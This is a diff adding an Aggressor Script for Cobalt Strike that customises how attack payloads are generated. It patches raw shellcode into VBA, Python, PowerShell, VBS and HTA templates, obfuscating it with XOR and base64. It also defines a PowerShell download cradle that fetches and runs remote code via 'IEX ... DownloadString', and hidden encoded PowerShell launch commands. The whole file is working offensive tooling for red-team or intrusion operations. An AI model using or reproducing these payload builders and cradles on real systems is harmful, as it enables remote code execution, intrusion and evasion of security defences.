@@ -1,0 +1,116 @@
+#
+# Aggressor Script to override Cobalt Strike's internal resources
+#
+
+# $1 = the file, $2 = x86 shellcode, $3 = x64 shellcode
+set RESOURCE_GENERATOR {
+	local('$handle $data');
+
+	# no resource? no problem.
+	if (!-exists script_resource($1)) {
+		return $null;
+	}
+
+	# read in the resource from the current folder
+	$handle = openf(script_resource($1));
+	$data   = readb($handle, -1);
+	closef($handle);
+
+	# format our shellcode AND patch it into the resource
+	if ($1 eq "template.x86.vba") {
+		return strrep($data, '$PAYLOAD$', 'myArray = ' . transform($2, "vba"));
+	}
+	else if ($1 eq "template.py") {
+		return strrep($data, '$$CODE32$$', transform($2, "veil"), 
+				     '$$CODE64$$', transform($3, "veil"));
+	}
+	else if ($1 eq "template.x86.ps1") {
+		return strrep($data, '%%DATA%%', base64_encode( str_xor($2, chr(35)) ));
+	}
+	else if ($1 eq "template.x64.ps1") {
+		return strrep($data, '%%DATA%%', base64_encode( str_xor($3, chr(35)) ));
+	}
+
+	# return null if we don't know about the resource (this allows some future-proofing)   
+	return $null;
+}
+
+# reduce the size of a PowerShell script.
+# $1 = the script to compress...
+set POWERSHELL_COMPRESS {
+	local('$handle $data');
+
+	# read in our compress template
+	$handle = openf(script_resource("compress.ps1"));
+	$data   = readb($handle, -1);
+	closef($handle);
+
+	# compress our script, base64 encode that, patch into compress.ps1
+	return strrep($data, '%%DATA%%', base64_encode(gzip($1)));
+}
+
+# PowerShell Download Cradle
+# $1 = URL to snag PowerShell script from. (often http://127.0.0.1:[port]/)
+set POWERSHELL_DOWNLOAD_CRADLE {
+	return "IEX (New-Object Net.Webclient).DownloadString(' $+ $1 $+ ')";
+}
+
+# Format our PowerShell Commands
+# $1 = the script we want to run, $2 = are we destined for a remote system? [true or false]
+set POWERSHELL_COMMAND {
+	local('$script');
+	$script = transform($1, "powershell-base64");
+	
+	# remote command (e.g., psexec_psh, wmi, etc.)
+	if ($2) {
+		return "powershell -nop -w hidden -encodedcommand $script";
+	}
+	# local command
+	else {
+		return "powershell -nop -exec bypass -EncodedCommand $script";
+	}
+}
+
+# reduce the size of a Python script. (or not)
+# $1 = the script to compress...
+set PYTHON_COMPRESS {
+	return "import base64; exec base64.b64decode(\"" . base64_encode($1) . "\")";
+}
+
+# HTML Application (Executable) Template
+# $1 = the EXE data, $2 = name of the .exe
+set HTMLAPP_EXE {
+	local('$handle $data');
+	$handle = openf(script_resource("template.exe.hta"));
+	$data   = readb($handle, -1);
+	closef($handle);
+
+	$data   = strrep($data, '##EXE##', transform($1, "hex"));
+	$data   = strrep($data, '##NAME##', $2);
+
+	return $data;
+}
+
+# HTML Application (PowerShell) Template
+# $1 = the command to run
+set HTMLAPP_POWERSHELL {
+	local('$handle $data');
+	$handle = openf(script_resource("template.psh.hta"));
+	$data   = readb($handle, -1);
+	closef($handle);
+
+	# push our command into the script
+	return strrep($data, "%%DATA%%", $1);
+}
+
+# VBS Template
+# $1 = the macro to embed
+set RESOURCE_GENERATOR_VBS {
+	local('$handle $data');
+	$handle = openf(script_resource("template.vbs"));
+	$data   = readb($handle, -1);
+	closef($handle);
+
+	return strrep($data, '$$CODE$$', transform_vbs($1, 8));
+}
+
